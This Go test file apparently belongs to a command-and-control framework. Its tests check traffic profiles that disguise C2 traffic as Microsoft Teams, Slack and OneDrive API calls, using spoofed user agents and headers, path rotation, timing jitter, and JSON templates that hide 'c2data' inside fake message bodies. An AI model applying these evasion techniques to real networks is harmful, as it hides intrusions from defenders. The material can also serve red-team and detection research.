package http

import (
	"strings"
	"testing"
	"time"
)

func TestGetTrafficProfile_Teams(t *testing.T) {
	p := GetTrafficProfile("teams")
	if p == nil {
		t.Fatal("teams profile should exist")
	}
	if len(p.GetPaths) == 0 {
		t.Error("teams should have GET paths")
	}
	if len(p.PostPaths) == 0 {
		t.Error("teams should have POST paths")
	}
	if len(p.UserAgents) == 0 {
		t.Error("teams should have user agents")
	}
	if _, ok := p.Headers["Authorization"]; !ok {
		t.Error("teams should have Authorization header")
	}
}

func TestGetTrafficProfile_Slack(t *testing.T) {
	p := GetTrafficProfile("slack")
	if p == nil {
		t.Fatal("slack profile should exist")
	}
	if len(p.GetPaths) < 5 {
		t.Error("slack should have multiple GET paths")
	}
	if len(p.ContentTypes) == 0 {
		t.Error("slack should have content types")
	}
}

func TestGetTrafficProfile_OneDrive(t *testing.T) {
	p := GetTrafficProfile("onedrive")
	if p == nil {
		t.Fatal("onedrive profile should exist")
	}
	if p.Name == "" {
		t.Error("onedrive should have a display name")
	}
	if len(p.PostPaths) == 0 {
		t.Error("onedrive should have POST paths")
	}
}

func TestGetTrafficProfile_Unknown(t *testing.T) {
	p := GetTrafficProfile("nonexistent")
	if p != nil {
		t.Error("unknown profile should return nil")
	}
}

func TestGetTrafficProfile_Generic(t *testing.T) {
	p := GetTrafficProfile("generic")
	if p != nil {
		t.Error("generic profile should return nil (no overrides)")
	}
}

func TestApplyTrafficProfile_Teams(t *testing.T) {
	h := &HTTPProfile{}
	ok := ApplyTrafficProfile(h, "teams")
	if !ok {
		t.Fatal("apply teams should succeed")
	}
	if len(h.ContentTypes) == 0 {
		t.Error("ContentTypes should be set")
	}
	if len(h.UserAgentPool) == 0 {
		t.Error("UserAgentPool should be set")
	}
	if h.UserAgent == "" {
		t.Error("UserAgent should be set")
	}
	if h.CustomHeaders == nil || h.CustomHeaders["Authorization"] == "" {
		t.Error("Authorization header should be set")
	}
}

func TestApplyTrafficProfile_NoOverrideExisting(t *testing.T) {
	h := &HTTPProfile{
		CustomHeaders: map[string]string{"Authorization": "custom-value"},
	}
	ApplyTrafficProfile(h, "teams")
	if h.CustomHeaders["Authorization"] != "custom-value" {
		t.Error("existing headers should not be overridden")
	}
}

func TestApplyTrafficProfile_Unknown(t *testing.T) {
	h := &HTTPProfile{}
	ok := ApplyTrafficProfile(h, "nonexistent")
	if ok {
		t.Error("unknown profile should return false")
	}
}

func TestApplyTrafficProfile_CopiesPaths(t *testing.T) {
	h := &HTTPProfile{}
	ApplyTrafficProfile(h, "teams")
	if len(h.GetPaths) == 0 {
		t.Error("GetPaths should be populated")
	}
	if len(h.PostPaths) == 0 {
		t.Error("PostPaths should be populated")
	}
}

func TestApplyTrafficProfile_CopiesJitter(t *testing.T) {
	h := &HTTPProfile{}
	ApplyTrafficProfile(h, "slack")
	if h.RequestJitterMinMs != 200 {
		t.Errorf("JitterMinMs = %d, want 200", h.RequestJitterMinMs)
	}
	if h.RequestJitterMaxMs != 2000 {
		t.Errorf("JitterMaxMs = %d, want 2000", h.RequestJitterMaxMs)
	}
}

func TestApplyTrafficProfile_CopiesWrapTemplates(t *testing.T) {
	h := &HTTPProfile{}
	ApplyTrafficProfile(h, "onedrive")
	if h.RequestWrap == "" {
		t.Error("RequestWrap should be set")
	}
	if h.ResponseWrap == "" {
		t.Error("ResponseWrap should be set")
	}
}

func TestRotatePath_NoPool(t *testing.T) {
	h := &HTTPProfile{}
	got := h.RotatePath("POST", "/data", nil)
	if got != "/data" {
		t.Errorf("RotatePath = %q, want /data", got)
	}
}

func TestRotatePath_RoundRobin(t *testing.T) {
	h := &HTTPProfile{PostPaths: []string{"/a", "/b", "/c"}}
	paths := make(map[string]bool)
	for i := 0; i < 6; i++ {
		paths[h.RotatePath("POST", "/data", nil)] = true
	}
	if len(paths) != 3 {
		t.Errorf("expected 3 unique paths, got %d", len(paths))
	}
}

func TestRotatePath_GetVsPost(t *testing.T) {
	h := &HTTPProfile{
		GetPaths:  []string{"/get-a"},
		PostPaths: []string{"/post-a"},
	}
	got := h.RotatePath("GET", "/data", nil)
	if got != "/get-a" {
		t.Errorf("GET RotatePath = %q, want /get-a", got)
	}
	got = h.RotatePath("POST", "/data", nil)
	if got != "/post-a" {
		t.Errorf("POST RotatePath = %q, want /post-a", got)
	}
}

func TestRotatePath_FromConfig(t *testing.T) {
	h := &HTTPProfile{}
	cfg := &sensitiveConfig{PostPaths: []string{"/cfg-path"}}
	got := h.RotatePath("POST", "/data", cfg)
	if got != "/cfg-path" {
		t.Errorf("RotatePath from config = %q, want /cfg-path", got)
	}
}

func TestApplyRequestJitter_NoJitter(t *testing.T) {
	h := &HTTPProfile{}
	start := time.Now()
	h.ApplyRequestJitter(nil)
	if time.Since(start) > 50*time.Millisecond {
		t.Error("no-jitter should return immediately")
	}
}

func TestApplyRequestJitter_WithJitter(t *testing.T) {
	h := &HTTPProfile{RequestJitterMinMs: 50, RequestJitterMaxMs: 100}
	start := time.Now()
	h.ApplyRequestJitter(nil)
	elapsed := time.Since(start)
	if elapsed < 50*time.Millisecond {
		t.Errorf("jitter too short: %v", elapsed)
	}
	if elapsed > 200*time.Millisecond {
		t.Errorf("jitter too long: %v", elapsed)
	}
}

func TestApplyRequestJitter_FromConfig(t *testing.T) {
	h := &HTTPProfile{RequestJitterMinMs: 5000, RequestJitterMaxMs: 6000}
	cfg := &sensitiveConfig{RequestJitterMinMs: 50, RequestJitterMaxMs: 100}
	start := time.Now()
	h.ApplyRequestJitter(cfg)
	elapsed := time.Since(start)
	if elapsed > 200*time.Millisecond {
		t.Errorf("should use config jitter (50-100ms), got %v", elapsed)
	}
}

func TestWrapRequest_NoTemplate(t *testing.T) {
	data := []byte("c2data")
	got := WrapRequest(data, "")
	if string(got) != "c2data" {
		t.Errorf("WrapRequest with no template should return original data")
	}
}

func TestWrapRequest_WithTemplate(t *testing.T) {
	data := []byte("c2data")
	tmpl := `{"text":"{DATA}"}`
	got := WrapRequest(data, tmpl)
	want := `{"text":"c2data"}`
	if string(got) != want {
		t.Errorf("WrapRequest = %s, want %s", got, want)
	}
}

func TestUnwrapResponse_NoTemplate(t *testing.T) {
	data := []byte("c2data")
	got := UnwrapResponse(data, "")
	if string(got) != "c2data" {
		t.Error("UnwrapResponse with no template should return original data")
	}
}

func TestUnwrapResponse_TeamsTemplate(t *testing.T) {
	tmpl := `{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#messages","value":[{"id":"AAMk","body":{"content":"{DATA}"}}]}`
	wrapped := `{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#messages","value":[{"id":"AAMk","body":{"content":"c2payload"}}]}`
	got := UnwrapResponse([]byte(wrapped), tmpl)
	if string(got) != "c2payload" {
		t.Errorf("UnwrapResponse = %q, want c2payload", got)
	}
}

func TestUnwrapResponse_SlackTemplate(t *testing.T) {
	tmpl := `{"ok":true,"channel":"C0123456789","ts":"1234567890.123456","message":{"text":"{DATA}"}}`
	wrapped := `{"ok":true,"channel":"C0123456789","ts":"1234567890.123456","message":{"text":"secret_data"}}`
	got := UnwrapResponse([]byte(wrapped), tmpl)
	if string(got) != "secret_data" {
		t.Errorf("UnwrapResponse = %q, want secret_data", got)
	}
}

func TestUnwrapResponse_MismatchReturnsOriginal(t *testing.T) {
	tmpl := `{"prefix":"{DATA}","suffix":"end"}`
	data := []byte("completely different format")
	got := UnwrapResponse(data, tmpl)
	if string(got) != string(data) {
		t.Error("mismatched data should return original")
	}
}

func TestWrapUnwrap_RoundTrip(t *testing.T) {
	templates := map[string]struct{ req, resp string }{
		"teams": {
			req:  `{"@odata.type":"#microsoft.graph.message","subject":"sync","body":{"contentType":"Text","content":"{DATA}"}}`,
			resp: `{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#messages","value":[{"id":"AAMk","body":{"content":"{DATA}"}}]}`,
		},
		"slack": {
			req:  `{"channel":"C0123456789","text":"{DATA}","unfurl_links":false}`,
			resp: `{"ok":true,"channel":"C0123456789","ts":"1234567890.123456","message":{"text":"{DATA}"}}`,
		},
	}
	original := "base64encodedC2data=="
	for name, tmpl := range templates {
		wrapped := WrapRequest([]byte(original), tmpl.req)
		unwrapped := UnwrapResponse(wrapped, tmpl.req)
		if string(unwrapped) != original {
			t.Errorf("%s request round-trip failed: got %q", name, unwrapped)
		}

		serverWrapped := []byte(strings.Replace(tmpl.resp, "{DATA}", original, 1))
		got := UnwrapResponse(serverWrapped, tmpl.resp)
		if string(got) != original {
			t.Errorf("%s response unwrap failed: got %q", name, got)
		}
	}
}

func TestAllProfiles_HaveJitter(t *testing.T) {
	for _, name := range []string{"teams", "slack", "onedrive"} {
		p := GetTrafficProfile(name)
		if p.JitterMinMs <= 0 {
			t.Errorf("%s JitterMinMs should be > 0", name)
		}
		if p.JitterMaxMs <= p.JitterMinMs {
			t.Errorf("%s JitterMaxMs (%d) should be > JitterMinMs (%d)", name, p.JitterMaxMs, p.JitterMinMs)
		}
	}
}

func TestAllProfiles_HaveWrapTemplates(t *testing.T) {
	for _, name := range []string{"teams", "slack", "onedrive"} {
		p := GetTrafficProfile(name)
		if p.RequestWrap == "" {
			t.Errorf("%s should have RequestWrap template", name)
		}
		if !strings.Contains(p.RequestWrap, "{DATA}") {
			t.Errorf("%s RequestWrap should contain {DATA} placeholder", name)
		}
		if p.ResponseWrap == "" {
			t.Errorf("%s should have ResponseWrap template", name)
		}
		if !strings.Contains(p.ResponseWrap, "{DATA}") {
			t.Errorf("%s ResponseWrap should contain {DATA} placeholder", name)
		}
	}
}
